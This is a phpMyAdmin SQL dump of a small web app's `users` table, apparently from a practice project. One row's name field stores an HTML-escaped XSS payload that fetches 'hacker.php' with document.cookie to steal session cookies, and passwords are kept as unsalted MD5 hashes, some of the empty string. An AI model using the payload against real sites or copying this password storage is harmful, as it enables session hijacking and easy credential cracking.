-- phpMyAdmin SQL Dump
-- version 5.1.1
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1:3306
-- Generation Time: Oct 05, 2023 at 01:01 AM
-- Server version: 5.7.36
-- PHP Version: 8.0.13

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `app_web1`
--

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
CREATE TABLE IF NOT EXISTS `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(100) NOT NULL,
  `fullname` varchar(100) NOT NULL,
  `email` varchar(100) NOT NULL,
  `type` varchar(100) NOT NULL,
  `password` varchar(250) NOT NULL,
  `version` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=31 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `name`, `fullname`, `email`, `type`, `password`, `version`) VALUES
(1, 'admin', 'Admin', 'admin1@gmail.com', 'admin', 'd41d8cd98f00b204e9800998ecf8427e', 1),
(2, 'user6', 'user10', 'user3@gmail.com', 'user', '24c9e15e52afc47c225b757e7bee1f9d', 1),
(9, '&lt;script&gt;fetch(&quot;hacker.php?cookie=&quot;+document.cookie); &lt;/script&gt;', '', '', '', 'd41d8cd98f00b204e9800998ecf8427e', 1),
(24, 'KhÃ´i', 'Nguyá»…n Minh KhÃ´i', 'Dono.120200@gmail.com', 'admin', 'd41d8cd98f00b204e9800998ecf8427e', 2),
(19, 'Há»“ VÄƒn ThÃ nh111', 'ThÃ nh111', 'Dono111.120200@gmail.com', 'admin', 'd41d8cd98f00b204e9800998ecf8427e', 5),
(30, 'khoi', '', '', '', '527f637c02215a3e9ac702dc23b176b1', 1),
(23, 'thanh123', 'Há»“ VÄƒn ThÃ nh123', 'thanh160523@gmail.com', 'admin', '81dc9bdb52d04dc20036dbd8313ed055', 4),
(29, 'khoi', '', '', '', '527f637c02215a3e9ac702dc23b176b1', 1);
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
